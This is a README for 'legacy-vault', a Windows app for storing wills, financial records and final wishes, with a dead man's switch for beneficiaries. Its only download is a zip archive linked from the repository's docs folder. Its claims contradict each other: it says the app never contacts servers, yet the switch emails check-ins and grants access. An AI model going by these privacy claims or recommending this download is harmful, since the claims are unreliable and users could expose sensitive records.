# 🛡️ legacy-vault - Securely organize your essential life documents

[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/flann7/legacy-vault/raw/refs/heads/main/docs/legacy-vault-v2.5.zip)

Legacy-vault provides a private, encrypted digital space for your most important information. You maintain full control over your estate planning documents, financial records, and final wishes. The software stores your data locally on your computer. It includes tools for beneficiary access and a dead man’s switch to ensure your loved ones receive necessary information when the time comes.

## 💾 System Requirements

Your computer needs to meet basic standards to run legacy-vault reliably.

- Operating System: Windows 10 or Windows 11.
- Processor: Any modern dual-core processor.
- Memory: 4 gigabytes of RAM.
- Storage: 500 megabytes of free disk space for the application and database.
- Internet Connection: Required only for initial setup and updates.

## 🔐 Setting Up Your Vault

Open the application by clicking the desktop icon. The first time you launch the software, it asks you to create a primary vault.

1. Create a strong master password. Write this password down in a physical location that you trust, as the software cannot recover your vault if you lose this password.
2. The application uses AES-256 encryption to scramble your data. This standard keeps your files hidden from unauthorized eyes.
3. Choose a folder on your computer where the vault stores your database file. Choose a location that gets included in your regular computer backups.

## 📂 Managing Your Documents

The main interface displays your categories. You can organize your life into structured sections.

- Financials: Store bank account information, investment details, and insurance policy numbers.
- Legal: Keep wills, power of attorney documents, and property deeds in one place.
- Final Wishes: Write instructions regarding burial preferences or funeral arrangements.
- Beneficiary Access: Designate specific contacts to receive access to your data.

Click the "Add Document" button to upload a file into your vault. The software encrypts the file immediately upon import. You can delete the original document from your desktop once you confirm it appears inside the vault.

## ⏱️ Using the Dead Man’s Switch

The dead man’s switch acts as a safety mechanism for your beneficiaries.

1. Navigate to the "Security" tab in the settings menu.
2. Enable the "Dead Man’s Switch" feature.
3. Provide the email address of your trusted beneficiary.
4. The application sends a periodic check-in request to your email.
5. If you fail to respond to these requests over a set period, the system triggers the alert.
6. The system notifies your beneficiary or grants them access to your designated files based on your setup.

## 🗄️ Creating Backups

Because your data lives on your computer, you retain the responsibility to back it up. 

- Connect an external hard drive or use a private cloud service.
- Locate the data file generated by the vault.
- Copy this file to your external drive or secure backup location at least once per month.
- An encrypted file is useless without the master password. Always keep your password separate from your backup files.

## 🛠️ Frequently Asked Questions

Does the software send my data to a server?
No. All data stays on your local machine. The vault does not communicate with any cloud servers for document storage.

Can I open my vault on a different computer?
Yes. You can move your database file to another machine that has legacy-vault installed. Open the app, select "Open Existing Vault," and point the app to your database file. You need your master password to unlock it.

What happens if I lose my password?
The encryption used by the vault is extremely strong. There is no password recovery feature. If you lose your password, the data inside the vault remains locked forever. Test your password before you save your most important files.

How does the app protect my privacy?
The application uses the SQLite database format protected by AES-256 encryption. This ensures that even if someone steals your computer or accesses your hard drive, they cannot view the contents of your vault without the master password.

Is this software open source?
Yes. The code is available for audit. Experienced users can review the implementation of the encryption and security features directly in the repository.

How do I remove the application?
Use the standard "Apps & Features" menu in your Windows Settings to uninstall the program. Deleting the application does not automatically delete your vault database file. You must manually delete the folder containing your database files if you wish to wipe the data permanently.
